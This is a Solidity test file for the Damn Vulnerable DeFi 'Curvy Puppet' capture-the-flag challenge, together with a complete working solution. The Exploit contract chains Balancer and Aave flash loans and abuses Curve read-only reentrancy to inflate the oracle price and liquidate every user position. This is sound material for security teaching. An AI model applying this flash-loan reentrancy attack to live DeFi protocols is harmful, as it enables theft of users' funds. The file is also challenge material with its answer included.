// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        // Move the treasury's offered capital into the exploit contract.
        //treasury approved `player` in setUp, and we run as player
        Exploit exploit = new Exploit(
            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
        );
        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);

        // Kick off the flash-loan, add_liquidity, remove_liquidity(reentrancy) then liquidate flow.
        exploit.run();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}



// from `https://github.com/balancer/balancer-v2-monorepo/blob/master/pkg/interfaces/contracts/vault/IVault.sol`
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

//from `https://github.com/lidofinance/core/blob/master/contracts/0.6.12/WstETH.sol`
interface IWstETH {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Exploit {
    //mainnet addresses
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; // Aave V3 Pool
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // flash-loan amounts (each must stay <= that lender's holdings)
    // Balancer holdings at the block are ~37,991 WETH, ~12,597 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // Aave holdings at the block are ~83,192 WETH, ~1,036,780 wstETH
    // The reentrancy spike (virtual_price) scales with the stETH side, so we deposit
    // MORE stETH than ETH. wstETH is sized to push virtual_price just past the
    // liquidation threshold (~3.5714e18). A bigger wstETH loan means a bigger Aave fee
    // which means less treasury cushion survives.
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    // ETH kept back (not converted to stETH) so the treasury ends with WETH > 0.
    uint256 constant ETH_RESERVE = 20e18;

    CurvyPuppetLending immutable lending;
    IStableSwap immutable curvePool;
    CurvyPuppetOracle immutable oracle;
    DamnValuableToken immutable dvt;
    IERC20 immutable stETH;
    WETH immutable weth;
    address immutable treasury;
    address immutable lpToken;
    address[3] users;

    // a flag that checks whether we're currently inside the liquidation window so receive() knows when it's safe to call liquidate().
    enum State { NONE, LIQUIDATING }
    State state;

    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _curvePool,
        CurvyPuppetOracle _oracle,
        DamnValuableToken _dvt,
        IERC20 _stETH,
        WETH _weth,
        address _treasury,
        address[3] memory _users
    ) {
        lending = _lending;
        curvePool = _curvePool;
        oracle = _oracle;
        dvt = _dvt;
        stETH = _stETH;
        weth = _weth;
        treasury = _treasury;
        users = _users;
        lpToken = _curvePool.lp_token();
    }

    function run() external {
        // OUTER loan (called first and repaid last). Balancer (no fee).
        // requires tokens sorted ascending by address: wstETH (0x7f39..) < WETH (0xC02a..)
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH);
        tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;
        amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // transfer assets to treasury
        weth.deposit{value: address(this).balance}();                                 
        dvt.transfer(treasury, dvt.balanceOf(address(this)));                          
        weth.transfer(treasury, weth.balanceOf(address(this)));                        
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this)));  
    }

    // Balancer call back. sent us BAL_WETH + BAL_WSTETH. Nest the Aave loan inside.
    function receiveFlashLoan(
        address[] memory, //tokens
        uint256[] memory, //amounts
        uint256[] memory, //fees (0)
        bytes memory //userData
    ) external {
        require(msg.sender == address(balancer), "not balancer");

        // INNER loan (Aave) its callback (executeOperation) runs the attack.
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2); // [0,0] = no debt opened, repay in full
        assets[0] = address(weth);
        assets[1] = address(wstETH);
        amts[0] = AAVE_WETH;
        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(
            abi.encodeWithSignature(
                "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
                address(this), assets, amts, modes, address(this), bytes(""), uint16(0)
            )
        );
        require(ok, "aave flashloan failed");

        // Back from Aave. repay Balancer.
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    // INNER callback. now holding Balancer + Aave tokens combined. Do everything here.
    function executeOperation(
        address[] calldata, //assets
        uint256[] calldata, //amounts
        uint256[] calldata fees,
        address initiator,
        bytes calldata 
    ) external returns (bool) {
        require(msg.sender == aavePool, "not aave");
        require(initiator == address(this), "bad initiator");

        // 1) turn ALL borrowed tokens into pool assets (ETH + stETH)
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));   // all WETH to ETH
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this))); // all wstETH to stETH
        stETH.approve(address(curvePool), type(uint256).max);

        // 2) add the combined oversized liquidity deposit: coin0 = ETH, coin1 = stETH
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);

        // 3) let the lending contract pull our LP (borrowAsset) during liquidate()
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));

        // 4) Remove liquidity. This makes the pool send us ETH directly, which triggers our receive() function, and that's where we liquidate.
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;

        // 5) Repay. After removal + liquidations we hold ETH (surplus) + stETH.
        //    We deposited mostly stETH and got back mostly ETH, so now we have
        //    extra ETH but are short on wstETH, and the two amounts are worth
        //    roughly the same. So we convert the extra ETH into stETH and wrap
        //    it into wstETH to cover what we owe.
        uint256 wethOwed   = AAVE_WETH + fees[0] + BAL_WETH;      
        uint256 wstethOwed = AAVE_WSTETH + fees[1] + BAL_WSTETH;  

        // First set aside exactly the WETH we owe.
        weth.deposit{value: wethOwed}();                              // ETH to WETH

        // Convert remaining ETH into stETH (keep ETH_RESERVE so treasury ends with WETH > 0).
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0))
            );
            require(ok, "lido submit failed");
        }

        // Wrap all stETH to wstETH. must cover everything we owe.
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");

        // Aave pulls its owed amounts via transferFrom when we return true.
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + fees[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + fees[1]);
        return true;
    }

    // Curve pool sends ETH here during remove_liquidity (read-only reentrancy window)
    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // virtual_price is inflated right now so every borrow position is liquidatable
        for (uint256 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
        }
    }
}

